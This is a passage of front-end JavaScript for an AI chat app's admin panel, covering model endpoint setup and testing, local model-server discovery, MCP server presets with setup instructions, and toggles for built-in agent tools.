        if (!parsed.pathname || parsed.pathname === '/') {
          u += '/v1';
        }
      } catch(e) {}
    }
    return u;
  }

  async function _defaultOllamaUrl() {
    try {
      const res = await fetch('/api/runtime', { credentials: 'same-origin' });
      if (res.ok) {
        const data = await res.json();
        if (data && data.ollama_base_url) return data.ollama_base_url;
      }
    } catch (_) {}
    return 'http://127.0.0.1:11434/v1';
  }

  function _renderEndpointTestResult(msg, res, d) {
    if (res.ok && d.status === 'empty') {
      msg.textContent = 'Online — no models found';
      msg.className = 'admin-success';
      return;
    }
    if (res.ok && d.online) {
      const models = d.models || [];
      const preview = models.slice(0, 3).map(m => esc(String(m).split('/').pop())).join(', ');
      msg.innerHTML = `Online — found ${models.length} model${models.length !== 1 ? 's' : ''}${preview ? `: ${preview}${models.length > 3 ? ', …' : ''}` : ''}`;
      msg.className = 'admin-success';
      return;
    }
    msg.textContent = (d && d.detail) || (d && d.ping_error ? `Offline — ${d.ping_error}` : 'Offline');
    msg.className = 'admin-error';
  }

  function _endpointMsg(kind) {
    return el(kind === 'local' ? 'adm-epLocalMsg' : 'adm-epApiMsg') || el('adm-epMsg');
  }

  let apiTestController = null;
  const apiTestBtn = el('adm-epApiTestBtn');
  const apiCancelTestBtn = el('adm-epApiCancelTestBtn');
  if (apiTestBtn) {
    apiTestBtn.addEventListener('click', async () => {
      const msg = _endpointMsg('api');
      msg.textContent = ''; msg.className = '';
      const rawUrl = (urlInput.value || provider.value).trim();
      const apiKey = el('adm-epApiKey').value.trim();
      if (!rawUrl) { msg.textContent = 'Select a provider or enter a base URL'; msg.className = 'admin-error'; return; }
      if (provider.value && !apiKey) { msg.textContent = 'API key is required for cloud providers'; msg.className = 'admin-error'; return; }
      const url = provider.value && rawUrl === provider.value ? rawUrl : _normalizeBaseUrl(rawUrl);
      apiTestController = new AbortController();
      apiTestBtn.disabled = true;
      apiTestBtn.textContent = 'Testing...';
      if (apiCancelTestBtn) apiCancelTestBtn.classList.remove('hidden');
      try {
        const fd = new FormData();
        fd.append('base_url', url);
        if (apiKey) fd.append('api_key', apiKey);
        const res = await fetch('/api/model-endpoints/test', {
          method: 'POST',
          body: fd,
          credentials: 'same-origin',
          signal: apiTestController.signal,
        });
        const d = await res.json();
        _renderEndpointTestResult(msg, res, d);
      } catch (e) {
        if (e && e.name === 'AbortError') {
          msg.textContent = 'Test canceled';
          msg.className = '';
        } else {
          msg.textContent = 'Test failed: ' + (e && e.message ? e.message : 'request failed');
          msg.className = 'admin-error';
        }
      }
      apiTestController = null;
      apiTestBtn.disabled = false;
      apiTestBtn.textContent = 'Test';
      if (apiCancelTestBtn) apiCancelTestBtn.classList.add('hidden');
    });
  }
  if (apiCancelTestBtn) {
    apiCancelTestBtn.addEventListener('click', () => {
      if (apiTestController) apiTestController.abort();
    });
  }

  el('adm-epAddBtn').addEventListener('click', async () => {
    const msg = _endpointMsg('api');
    msg.textContent = ''; msg.className = '';
    const rawUrl = (urlInput.value || provider.value).trim();
    const apiKey = el('adm-epApiKey').value.trim();
    if (!rawUrl) { msg.textContent = 'Select a provider or enter a base URL'; msg.className = 'admin-error'; return; }
    if (provider.value && !apiKey) { msg.textContent = 'API key is required for cloud providers'; msg.className = 'admin-error'; return; }
    // Normalize URL (fix typos, add /v1, strip wrong paths)
    const url = provider.value && rawUrl === provider.value ? rawUrl : _normalizeBaseUrl(rawUrl);
    const btn = el('adm-epAddBtn');
    btn.disabled = true; btn.textContent = 'Adding...';
    try {
      const fd = new FormData();
      fd.append('base_url', url);
      if (apiKey) fd.append('api_key', apiKey);
      if (provider.value && provider.selectedOptions && provider.selectedOptions[0]) {
        fd.append('name', provider.selectedOptions[0].textContent.trim());
      }
      const epType = el('adm-epType');
      if (epType) fd.append('model_type', epType.value);
      if (provider.value && /openrouter\.ai|ollama\.com/i.test(provider.value)) fd.append('require_models', 'true');
      else fd.append('skip_probe', 'false');
      const res = await fetch('/api/model-endpoints', { method: 'POST', body: fd, credentials: 'same-origin' });
      const d = await res.json();
      if (res.ok) {
        const count = d.models ? d.models.length : 0;
        urlInput.value = ''; urlInput.style.display = '';
        el('adm-epApiKey').value = ''; provider.value = '';
        if (epType) epType.value = 'llm';
        if (d.id) _recentlyAddedEpId = String(d.id);
        await loadEndpoints();
        await _selectAddedModelInChat(d);
        if (!d.online) {
          msg.textContent = 'Added (endpoint offline — will retry on next load)';
          msg.className = 'admin-error';
        } else if (d.status === 'empty') {
          msg.textContent = 'Added — endpoint reachable, no models found';
          msg.className = 'admin-success';
        } else {
          msg.textContent = `Added — found ${count} model${count !== 1 ? 's' : ''}`;
          msg.className = 'admin-success';
        }
      } else { msg.textContent = d.detail || 'Failed'; msg.className = 'admin-error'; }
    } catch (e) { msg.textContent = 'Request failed'; msg.className = 'admin-error'; }
    btn.disabled = false; btn.textContent = 'Add';
  });

  // Local "Add" button — sibling form for self-hosted base URLs.
  const localAddBtn = el('adm-epLocalAddBtn');
  const localTestBtn = el('adm-epLocalTestBtn');
  if (localTestBtn) {
    localTestBtn.addEventListener('click', async () => {
      const msg = _endpointMsg('local');
      msg.textContent = ''; msg.className = '';
      const raw = (el('adm-epLocalUrl').value || '').trim();
      if (!raw) { msg.textContent = 'Enter a base URL to test'; msg.className = 'admin-error'; return; }
      const url = _normalizeBaseUrl(raw);
      const keyEl = el('adm-epLocalApiKey');
      const apiKey = keyEl ? keyEl.value.trim() : '';
      localTestBtn.disabled = true;
      localTestBtn.textContent = 'Testing...';
      try {
        const fd = new FormData();
        fd.append('base_url', url);
        if (apiKey) fd.append('api_key', apiKey);
        const res = await fetch('/api/model-endpoints/test', { method: 'POST', body: fd, credentials: 'same-origin' });
        const d = await res.json();
        _renderEndpointTestResult(msg, res, d);
      } catch (e) {
        msg.textContent = 'Test failed: ' + (e && e.message ? e.message : 'request failed');
        msg.className = 'admin-error';
      }
      localTestBtn.disabled = false;
      localTestBtn.textContent = 'Test';
    });
  }
  if (localAddBtn) {
    localAddBtn.addEventListener('click', async () => {
      const msg = _endpointMsg('local');
      msg.textContent = ''; msg.className = '';
      const raw = (el('adm-epLocalUrl').value || '').trim();
      if (!raw) { msg.textContent = 'Enter a base URL (e.g. http://localhost:8002/v1)'; msg.className = 'admin-error'; return; }
      const url = _normalizeBaseUrl(raw);
      const keyEl = el('adm-epLocalApiKey');
      const apiKey = keyEl ? keyEl.value.trim() : '';
      localAddBtn.disabled = true; localAddBtn.textContent = 'Adding...';
      try {
        const fd = new FormData();
        fd.append('base_url', url);
        if (apiKey) fd.append('api_key', apiKey);
        const lt = el('adm-epLocalType');
        if (lt) fd.append('model_type', lt.value);
        fd.append('skip_probe', 'false');
        const res = await fetch('/api/model-endpoints', { method: 'POST', body: fd, credentials: 'same-origin' });
        const d = await res.json();
        if (res.ok) {
          el('adm-epLocalUrl').value = '';
          if (keyEl) keyEl.value = '';
          if (lt) lt.value = 'llm';
          if (d.id) _recentlyAddedEpId = String(d.id);
          await loadEndpoints();
          await _selectAddedModelInChat(d);
          const count = (d.models || []).length;
          msg.textContent = d.status === 'empty'
            ? 'Added — Ollama is running, no models pulled yet'
            : d.online
            ? `Added — found ${count} model${count !== 1 ? 's' : ''}`
            : 'Added (offline — will retry on next load)';
          msg.className = d.online ? 'admin-success' : 'admin-error';
        } else { msg.textContent = d.detail || 'Failed'; msg.className = 'admin-error'; }
      } catch (e) { msg.textContent = 'Request failed'; msg.className = 'admin-error'; }
      localAddBtn.disabled = false; localAddBtn.textContent = 'Add';
    });
  }

  const ollamaBtn = el('adm-epOllamaBtn');
  if (ollamaBtn) {
    ollamaBtn.addEventListener('click', async () => {
      const input = el('adm-epLocalUrl');
      if (input) {
        input.value = await _defaultOllamaUrl();
        input.focus();
      }
      const msg = _endpointMsg('local');
      if (msg) {
        msg.innerHTML = '<span style="font-size:11px;opacity:0.55;">Ollama ready to test.</span>';
        msg.className = '';
      }
    });
  }

  // Discover local models button
  const discoverBtn = el('adm-epDiscoverBtn');
  if (discoverBtn) {
    discoverBtn.addEventListener('click', async () => {
      const msg = _endpointMsg('local');
      discoverBtn.disabled = true;
      // Keep the button's icon as-is while scanning; the whirlpool +
      // status text below is enough feedback. (Two spinning indicators
      // at once looks busy.)
      msg.className = '';
      msg.innerHTML = '';
      try {
        const sp = window.spinnerModule || (await import('./spinner.js')).default;
        const wp = sp.createWhirlpool(20);
        wp.element.style.cssText = 'display:inline-block;vertical-align:middle;margin:0 8px 0 0;';
        const wrap = document.createElement('div');
        wrap.style.cssText = 'display:flex;align-items:center;padding:8px 0;';
        wrap.appendChild(wp.element);
        const txt = document.createElement('span');
        txt.textContent = 'Scanning ports 8000-8020 and 11434 for model servers...';
        txt.style.cssText = 'font-size:12px;opacity:0.7;';
        wrap.appendChild(txt);
        msg.appendChild(wrap);
        discoverBtn._wp = wp;
      } catch(e) { msg.textContent = 'Scanning...'; }
      try {
        const res = await fetch('/api/discover');
        const data = await res.json();
        const items = data.items || [];
        if (!items.length) {
          msg.textContent = 'No model servers found. Make sure vLLM, llama.cpp, SGLang, or Ollama is running. Docker users may need Ollama bound to a trusted reachable interface.';
          msg.className = 'admin-error';
        } else {
          // Auto-add each discovered endpoint. Server dedupes on base_url
          // and returns `existing: true` for already-registered ones.
          let added = 0;
          let skipped = 0;
          for (const item of items) {
            const base = item.url.replace('/chat/completions', '').replace(/\/$/, '');
            const fd = new FormData();
            fd.append('base_url', base);
            fd.append('skip_probe', 'false');
            const r = await fetch('/api/model-endpoints', { method: 'POST', body: fd });
            if (r.ok) {
              try {
                const dd = await r.json();
                if (dd && dd.existing) { skipped++; }
                else { added++; if (dd && dd.id) _recentlyAddedEpId = String(dd.id); }
              } catch (_) { added++; }
            }
          }
          const totalModels = items.reduce((n, i) => n + (i.models ? i.models.length : 0), 0);
          const parts = [`Found ${items.length} server${items.length !== 1 ? 's' : ''} with ${totalModels} model${totalModels !== 1 ? 's' : ''}`];
          if (added) parts.push(`added ${added} new`);
          if (skipped) parts.push(`${skipped} already added`);
          msg.innerHTML = parts.join(' — ');
          msg.className = 'admin-success';
          loadEndpoints();
        }
      } catch (e) {
        msg.textContent = 'Scan failed: ' + e.message;
        msg.className = 'admin-error';
      }
      if (discoverBtn._wp) { discoverBtn._wp.destroy(); discoverBtn._wp = null; }
      discoverBtn.disabled = false;
      discoverBtn.innerHTML = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" style="vertical-align:-1px;margin-right:4px;"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>Scan for Servers';
    });
  }

  // Collapsible Add-Models subsections (API / Local). Both start collapsed
  // so the card is compact; the last-used state is remembered per section
  // in localStorage so a frequent API-adder doesn't re-expand every time.
  document.querySelectorAll('#adm-add-api, #adm-add-local').forEach((sec) => {
    const head = sec.querySelector('.adm-section-toggle');
    if (!head) return;
    const key = 'odysseus.addModels.' + sec.id + '.open';
    let open = false;
    try { open = localStorage.getItem(key) === '1'; } catch {}
    const apply = () => {
      sec.classList.toggle('collapsed', !open);
      head.setAttribute('aria-expanded', open ? 'true' : 'false');
    };
    apply();
    const toggle = () => {
      open = !open;
      try { localStorage.setItem(key, open ? '1' : '0'); } catch {}
      apply();
    };
    head.addEventListener('click', toggle);
    head.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); toggle(); }
    });
  });
  document.querySelectorAll('.adm-quickstart-section').forEach((sec) => {
    const head = sec.querySelector('.adm-quickstart-toggle');
    if (!head) return;
    const key = 'odysseus.addModels.' + sec.id + '.open';
    let open = false;
    try { open = localStorage.getItem(key) === '1'; } catch {}
    const apply = () => {
      sec.classList.toggle('collapsed', !open);
      head.setAttribute('aria-expanded', open ? 'true' : 'false');
    };
    apply();
    const toggle = () => {
      open = !open;
      try { localStorage.setItem(key, open ? '1' : '0'); } catch {}
      apply();
    };
    head.addEventListener('click', toggle);
    head.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); toggle(); }
    });
  });
}

/* ═══════════════════════════════════════════
   TOOLS TAB — MCP
   ═══════════════════════════════════════════ */

const _GOOGLE_OAUTH_HELP = `To get Google OAuth credentials:
1. Go to console.cloud.google.com
2. Click the project dropdown (top left) > New Project > name it > Create
3. APIs & Services > Library > enable the API you need (Gmail, Calendar, Drive, etc.)
4. APIs & Services > OAuth consent screen > configure (External, app name + email)
5. Under Audience, click Add Users > add your Google email as a test user
6. APIs & Services > Credentials > + Create Credentials > OAuth Client ID > Desktop App
7. Copy the Client ID and Client Secret into the fields above
8. After adding the server, click Authorize to sign in with Google
9. If accessing remotely: sign in, then copy the URL from the error page and paste it back`;

const MCP_PRESETS = [
  { name: "Gmail",           command: "npx", args: ["-y", "@gongrzhe/server-gmail-autoauth-mcp"],      env: { GOOGLE_CLIENT_ID: "", GOOGLE_CLIENT_SECRET: "" },
    oauthFile: { dir: "~/.gmail-mcp", filename: "gcp-oauth.keys.json" },
    oauth: {
      provider: "google",
      keys_file: "~/.gmail-mcp/gcp-oauth.keys.json",
      token_file: "~/.gmail-mcp/credentials.json",
      scopes: ["https://www.googleapis.com/auth/gmail.modify", "https://www.googleapis.com/auth/gmail.settings.basic"],
    },
    help: `Setup:
1. Go to console.cloud.google.com > create or select a project
2. APIs & Services > Library > search "Gmail API" > Enable
3. APIs & Services > OAuth consent screen > set up (External is fine)
4. Under Audience, add your Gmail address as a test user
5. APIs & Services > Credentials > + Create Credentials > OAuth Client ID
6. Application type: Desktop App > Create
7. Copy the Client ID and Client Secret into the fields above
8. Click Add Server, then click the Authorize button
9. Sign in with Google, copy the URL from the error page, paste it back` },
  { name: "Email (IMAP/SMTP)", command: "npx", args: ["-y", "@codefuturist/email-mcp", "stdio"],        env: { MCP_EMAIL_ADDRESS: "", MCP_EMAIL_PASSWORD: "", MCP_EMAIL_IMAP_HOST: "", MCP_EMAIL_SMTP_HOST: "" },
    providerDropdown: {
      label: "Provider",
      targets: { MCP_EMAIL_IMAP_HOST: "imap", MCP_EMAIL_SMTP_HOST: "smtp" },
      options: [
        { name: "Migadu",        imap: "imap.migadu.com",     smtp: "smtp.migadu.com" },
        { name: "Fastmail",      imap: "imap.fastmail.com",   smtp: "smtp.fastmail.com" },
        { name: "Proton Bridge", imap: "127.0.0.1",           smtp: "127.0.0.1" },
        { name: "Outlook/Hotmail", imap: "outlook.office365.com", smtp: "smtp.office365.com" },
        { name: "Yahoo",         imap: "imap.mail.yahoo.com", smtp: "smtp.mail.yahoo.com" },
        { name: "iCloud",        imap: "imap.mail.me.com",    smtp: "smtp.mail.me.com" },
        { name: "Zoho",          imap: "imap.zoho.com",       smtp: "smtp.zoho.com" },
        { name: "Custom",        imap: "",                    smtp: "" },
      ],
    },
    help: "Works with any IMAP/SMTP email provider.\n1. Pick your provider from the dropdown (or choose Custom)\n2. Enter your email address and password (or app password)\n3. Click Add Server" },
  { name: "CalDAV (Radicale/Nextcloud)", command: "npx", args: ["-y", "caldav-mcp"],                     env: { CALDAV_BASE_URL: "http://localhost:5232", CALDAV_USERNAME: "", CALDAV_PASSWORD: "" },
    help: "Works with any CalDAV server (Radicale, Nextcloud, etc.).\n1. Enter your CalDAV server URL (e.g. http://localhost:5232)\n2. Enter your username and password\n3. Click Add Server" },
  { name: "Google Calendar", command: "npx", args: ["-y", "@cocal/google-calendar-mcp"],                 env: { GOOGLE_OAUTH_CREDENTIALS: "" },
    help: `Setup:
1. Go to console.cloud.google.com > create/select a project
2. APIs & Services > Library > enable Google Calendar API
3. APIs & Services > Credentials > + Create Credentials > OAuth Client ID
4. Application type: Desktop App > Create
5. Click "Download JSON" on the credential you just created
6. Set Google Oauth Credentials to the full path of the downloaded JSON file` },
  { name: "Google Drive",    command: "npx", args: ["-y", "@modelcontextprotocol/server-gdrive"],        env: {},
    help: "Google Drive uses browser-based OAuth on first run. No env vars needed — just click Add and authorize when prompted." },
  { name: "GitHub",          command: "npx", args: ["-y", "@modelcontextprotocol/server-github"],        env: { GITHUB_PERSONAL_ACCESS_TOKEN: "" },
    help: "1. Go to github.com > Settings > Developer Settings > Personal Access Tokens > Fine-grained tokens\n2. Generate a new token with the repo permissions you need\n3. Paste it as Github Personal Access Token" },
  { name: "Slack",           command: "npx", args: ["-y", "@modelcontextprotocol/server-slack"],         env: { SLACK_BOT_TOKEN: "", SLACK_TEAM_ID: "" },
    help: "1. Go to api.slack.com/apps > Create New App > From Scratch\n2. Add Bot Token Scopes (channels:read, chat:write, etc.)\n3. Install to workspace, copy the Bot User OAuth Token (xoxb-...)\n4. Team ID is in your workspace URL or Slack admin settings" },
  { name: "Notion",          command: "npx", args: ["-y", "@notionhq/notion-mcp-server"],               env: { OPENAPI_MCP_HEADERS: "" },
    help: "1. Go to notion.so/my-integrations\n2. Create a new integration\n3. Copy the Internal Integration Secret\n4. Share the Notion pages/databases you want accessible with the integration\n5. For Openapi Mcp Headers enter:\n   {\"Authorization\": \"Bearer YOUR_SECRET\", \"Notion-Version\": \"2022-06-28\"}" },
  { name: "Linear",          command: "npx", args: ["-y", "mcp-linear"],                                env: { LINEAR_API_KEY: "" },
    help: "1. Go to linear.app > Settings > API\n2. Create a Personal API Key\n3. Paste it as Linear Api Key" },
  { name: "Brave Search",    command: "npx", args: ["-y", "@modelcontextprotocol/server-brave-search"], env: { BRAVE_API_KEY: "" },
    help: "1. Go to brave.com/search/api\n2. Sign up for a free plan (2000 queries/month)\n3. Copy your API key" },
  { name: "Browser (Playwright)", command: "npx", args: ["-y", "@playwright/mcp@latest", "--headless"],  env: {},
    help: "Browser automation via Playwright. The AI can navigate pages, click, fill forms, and read content.\nRuns headless by default. Remove --headless from Args to see the browser window.\nFirst run installs Chromium automatically." },
  { name: "Filesystem",      command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "/home"], env: {},
    help: "Edit the Args field to change which directory the server has access to." },
  { name: "Memory",          command: "npx", args: ["-y", "@modelcontextprotocol/server-memory"],        env: {} },
  { name: "Postgres",        command: "npx", args: ["-y", "@modelcontextprotocol/server-postgres", "postgresql://user:pass@localhost/db"], env: {},
    help: "Replace the connection string in the Args field with your actual Postgres connection URL." },
  { name: "Todoist",         command: "npx", args: ["-y", "todoist-mcp-server"],                         env: { TODOIST_API_TOKEN: "" },
    help: "1. Go to todoist.com > Settings > Integrations > Developer\n2. Copy your API token" },
];
// ── Built-in tools management ──
const TOOL_META = {
  bash:              { name: 'Shell',            desc: 'Execute bash commands',           cat: 'Code',       ctx: '~200' },
  python:            { name: 'Python',           desc: 'Run Python scripts',              cat: 'Code',       ctx: '~200' },
  read_file:         { name: 'Read File',        desc: 'Read files from disk',            cat: 'Code',       ctx: '~150' },
  write_file:        { name: 'Write File',       desc: 'Write/create files',              cat: 'Code',       ctx: '~150' },
  web_search:        { name: 'Web Search',       desc: 'Search the web via SearXNG',      cat: 'Search',     ctx: '~300' },
  search_chats:      { name: 'Search Chats',     desc: 'Search conversation history',     cat: 'Search',     ctx: '~150' },
  create_document:   { name: 'Create Document',  desc: 'Create new documents',            cat: 'Documents',  ctx: '~200' },
  update_document:   { name: 'Update Document',  desc: 'Modify existing documents',       cat: 'Documents',  ctx: '~200' },
  edit_document:     { name: 'Edit Document',    desc: 'Find & replace in documents',     cat: 'Documents',  ctx: '~200' },
  suggest_document:  { name: 'Suggest Changes',  desc: 'Propose document edits',          cat: 'Documents',  ctx: '~200' },
  manage_documents:  { name: 'Manage Documents', desc: 'List, delete, organize docs',     cat: 'Documents',  ctx: '~150' },
  generate_image:    { name: 'Generate Image',   desc: 'Create images via AI',            cat: 'Media',      ctx: '~150' },
  manage_memory:     { name: 'Memory',           desc: 'Save and recall memories',        cat: 'Knowledge',  ctx: '~200' },
  manage_skills:     { name: 'Skills',           desc: 'Learn and use procedures',        cat: 'Knowledge',  ctx: '~200' },
  manage_rag:        { name: 'RAG / Docs',       desc: 'Query indexed documents',         cat: 'Knowledge',  ctx: '~150' },
  chat_with_model:   { name: 'Chat with Model',  desc: 'Talk to another AI model',        cat: 'Multi-Agent', ctx: '~200' },
  second_opinion:    { name: 'Second Opinion',   desc: 'Get another model\'s take',       cat: 'Multi-Agent', ctx: '~150' },
  pipeline:          { name: 'Pipeline',         desc: 'Multi-step AI workflows',         cat: 'Multi-Agent', ctx: '~200' },
  ask_teacher:       { name: 'Ask Teacher',      desc: 'Query a more capable model',      cat: 'Multi-Agent', ctx: '~150' },
  send_to_session:   { name: 'Send to Session',  desc: 'Send message to another chat',    cat: 'Sessions',   ctx: '~100' },
  create_session:    { name: 'Create Session',   desc: 'Start a new chat session',        cat: 'Sessions',   ctx: '~100' },
  list_sessions:     { name: 'List Sessions',    desc: 'Browse existing sessions',        cat: 'Sessions',   ctx: '~100' },
  manage_session:    { name: 'Manage Session',   desc: 'Rename, archive, configure',      cat: 'Sessions',   ctx: '~100' },
  list_models:       { name: 'List Models',      desc: 'Show available models',           cat: 'System',     ctx: '~100' },
  ui_control:        { name: 'UI Control',       desc: 'Change theme, layout, settings',  cat: 'System',     ctx: '~150' },
  manage_tasks:      { name: 'Tasks',            desc: 'Schedule automated tasks',        cat: 'System',     ctx: '~150' },
  api_call:          { name: 'API Call',         desc: 'Make HTTP requests',              cat: 'System',     ctx: '~200' },
  manage_endpoints:  { name: 'Endpoints',        desc: 'Add/remove model endpoints',      cat: 'System',     ctx: '~100' },
  manage_mcp:        { name: 'MCP Servers',      desc: 'Manage MCP connections',          cat: 'System',     ctx: '~100' },
  manage_webhooks:   { name: 'Webhooks',         desc: 'Configure webhook events',        cat: 'System',     ctx: '~100' },
  manage_tokens:     { name: 'API Tokens',       desc: 'Manage API access tokens',        cat: 'System',     ctx: '~100' },
  manage_settings:   { name: 'Settings',         desc: 'Change app settings',             cat: 'System',     ctx: '~100' },
};

async function loadBuiltinTools() {
  const list = el('adm-builtin-tools-list');
  if (!list) return;
  try {
    const res = await fetch('/api/tools', { credentials: 'same-origin' });
    const data = await res.json();
    const tools = data.tools || [];
    if (!tools.length) { list.innerHTML = '<div class="admin-empty">No tools found</div>'; return; }

    // Group by category
    const groups = {};
    for (const t of tools) {
      const meta = TOOL_META[t.id] || { name: t.id, desc: '', cat: 'Other', ctx: '?' };
      const cat = meta.cat;
      if (!groups[cat]) groups[cat] = [];
      groups[cat].push({ ...t, ...meta });
    }

    // Category order
    const catOrder = ['Code', 'Search', 'Documents', 'Media', 'Knowledge', 'Multi-Agent', 'Sessions', 'System', 'Other'];
    let html = '';
    for (const cat of catOrder) {
      const items = groups[cat];
      if (!items) continue;
      const enabledCount = items.filter(i => i.enabled).length;
      const totalCount = items.length;
      const catId = 'tool-cat-' + cat.replace(/[^a-zA-Z]/g, '');
      const allEnabled = enabledCount === totalCount;
      html += `<div class="admin-tool-category">
        <div class="admin-tool-cat-header" data-tool-cat="${catId}" style="cursor:pointer;display:flex;align-items:center;justify-content:space-between;">
          <span>${esc(cat)}</span>
          <span style="display:flex;align-items:center;gap:6px;" class="admin-tool-cat-right">
            <span class="admin-tool-cat-count" style="font-size:10px;opacity:0.5;">${enabledCount}/${totalCount}</span>
            <label class="admin-switch" style="flex-shrink:0;">
              <input type="checkbox" data-tool-cat-toggle="${catId}" ${allEnabled ? 'checked' : ''}>
              <span class="admin-slider"></span>
            </label>
            <svg class="admin-tool-cat-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.3;transition:transform 0.2s,opacity 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>
          </span>
        </div>
        <div class="admin-tool-cat-body hidden" id="${catId}">`;
      for (const t of items) {
        html += `
        <div class="admin-tool-row">
          <div class="admin-tool-info">
            <span class="admin-tool-name">${esc(t.name)}</span>
            <span class="admin-tool-desc">${esc(t.desc)}</span>
          </div>
          <span class="admin-tool-ctx" title="Approximate context tokens used">${esc(t.ctx)}</span>
          <label class="admin-switch" style="flex-shrink:0;">
            <input type="checkbox" data-tool-id="${esc(t.id)}" ${t.enabled ? 'checked' : ''}>
            <span class="admin-slider"></span>
          </label>
        </div>`;
      }
      html += '</div></div>';
    }
    list.innerHTML = html;

    // Prevent toggle clicks from expanding/collapsing
    list.querySelectorAll('.admin-tool-cat-right').forEach(span => {
      span.addEventListener('click', e => e.stopPropagation());
    });

    // Wire category expand/collapse
    list.querySelectorAll('[data-tool-cat]').forEach(header => {
      header.addEventListener('click', () => {
        const body = el(header.dataset.toolCat);
        if (!body) return;
        body.classList.toggle('hidden');
        const chevron = header.querySelector('.admin-tool-cat-chevron');
        const isOpen = !body.classList.contains('hidden');
        if (chevron) {
          chevron.style.transform = isOpen ? 'rotate(180deg)' : '';
          chevron.style.opacity = isOpen ? '0.7' : '0.3';
        }
      });
    });

    // Helper: save disabled tools + update counters
    async function _saveToolState() {
      const allChecks = list.querySelectorAll('input[data-tool-id]');
      const disabled = [];
      allChecks.forEach(c => { if (!c.checked) disabled.push(c.dataset.toolId); });
      await fetch('/api/tools', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ disabled }),
        credentials: 'same-origin',
      });
    }
    function _updateCatCounter(catEl) {
      if (!catEl) return;
      const catChecks = catEl.querySelectorAll('input[data-tool-id]');
      const catEnabled = Array.from(catChecks).filter(c => c.checked).length;
      const counter = catEl.querySelector('.admin-tool-cat-count');
      if (counter) counter.textContent = catEnabled + '/' + catChecks.length;
      const catToggle = catEl.querySelector('input[data-tool-cat-toggle]');
      if (catToggle) catToggle.checked = (catEnabled === catChecks.length);
    }

    // Wire individual tool toggles
    list.querySelectorAll('input[data-tool-id]').forEach(chk => {
      chk.addEventListener('change', async () => {
        await _saveToolState();
        _updateCatCounter(chk.closest('.admin-tool-category'));
      });
    });

    // Wire category-level toggle (enable/disable all in category)
    list.querySelectorAll('input[data-tool-cat-toggle]').forEach(chk => {
      chk.addEventListener('change', async () => {
        const catEl = chk.closest('.admin-tool-category');
        if (!catEl) return;
        const checked = chk.checked;
        catEl.querySelectorAll('input[data-tool-id]').forEach(c => { c.checked = checked; });
        await _saveToolState();
        _updateCatCounter(catEl);
      });
    });
  } catch (e) {
    console.error('Failed to load tools:', e);
    list.innerHTML = '<div class="admin-empty">Failed to load tools</div>';
  }
}

async function loadMcpServers() {
  const list = el('adm-mcpList');
  if (!list) return;  // MCP section not visible / not yet rendered
  try {
    const res = await fetch('/api/mcp/servers', { credentials: 'same-origin' });
    const servers = await res.json();
    if (!servers.length) { list.innerHTML = '<div class="admin-empty">No MCP servers configured</div>'; return; }
    list.innerHTML = servers.map(s => {
      const statusColor = s.needs_oauth ? '#e5a33a' : s.status === 'connected' ? 'var(--fg)' : s.status === 'error' ? 'var(--red)' : 'color-mix(in srgb, var(--fg) 50%, transparent)';
      const toolInfo = s.status === 'connected' ? `${s.enabled_tool_count}/${s.tool_count} tools enabled` : '';
      const statusText = s.needs_oauth ? 'Needs authorization' : s.status === 'connected' ? `Connected (${toolInfo})` : s.status === 'error' ? `Error: ${s.error || 'unknown'}` : 'Disconnected';
      const hasTools = s.status === 'connected' && s.tool_count > 0;
      return `<div class="admin-user-row" data-adm-mcp-id="${s.id}">
        <div style="display:flex;align-items:center;justify-content:space-between;${hasTools ? 'cursor:pointer;' : ''}padding:4px 0;" data-adm-mcp-header="${s.id}">
          <div class="admin-user-info" style="flex:1;flex-wrap:wrap;gap:0.3rem;">
            <span class="admin-user-name">${esc(s.name)}</span>
            <span class="admin-badge" style="background:${statusColor}33;color:${statusColor}">${statusText}</span>
            ${hasTools ? `<span style="font-size:10px;opacity:0.4;">Click to manage tools</span>` : ''}
          </div>
          <div style="display:flex;gap:4px;align-items:center;">
            ${s.needs_oauth ? `<a href="/api/mcp/oauth/authorize/${s.id}" target="_blank" class="admin-btn-sm" style="background:var(--red);color:#fff;text-decoration:none;padding:3px 10px;border-radius:4px;font-size:11px;font-weight:600;">Authorize</a>` : ''}
            <button class="admin-btn-sm" data-adm-mcp-reconnect="${s.id}">Reconnect</button>
            <button class="admin-btn-delete" style="border-color:${s.is_enabled ? 'color-mix(in srgb, var(--red) 30%, transparent)' : 'color-mix(in srgb, var(--fg) 30%, transparent)'};color:${s.is_enabled ? 'var(--red)' : 'var(--fg)'};" data-adm-mcp-toggle="${s.id}" data-adm-mcp-enable="${!s.is_enabled}">${s.is_enabled ? 'Disable' : 'Enable'}</button>
            <button class="admin-btn-delete" data-adm-mcp-delete="${s.id}">Delete</button>
            ${hasTools ? '<svg class="admin-user-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.3;transition:transform 0.2s,opacity 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>' : ''}
          </div>
        </div>
        ${hasTools ? `<div class="mcp-tools-panel hidden" data-adm-mcp-tools-panel="${s.id}"></div>` : ''}
      </div>`;
    }).join('');
    list.querySelectorAll('[data-adm-mcp-reconnect]').forEach(btn => {
      btn.addEventListener('click', async () => {
        const msg = el('adm-mcpMsg'); msg.textContent = 'Reconnecting...'; msg.className = '';
        try {
          const res = await fetch(`/api/mcp/servers/${btn.dataset.admMcpReconnect}/reconnect`, { method: 'POST', credentials: 'same-origin' });
          const data = await res.json();
          msg.textContent = data.connected ? `Reconnected (${data.tool_count} tools)` : `Failed: ${data.error || 'unknown'}`;
          msg.className = data.connected ? 'admin-success' : 'admin-error';
          loadMcpServers();
        } catch (e) { msg.textContent = 'Failed: ' + e.message; msg.className = 'admin-error'; }
      });
    });
    list.querySelectorAll('[data-adm-mcp-toggle]').forEach(btn => {
      btn.addEventListener('click', async () => {
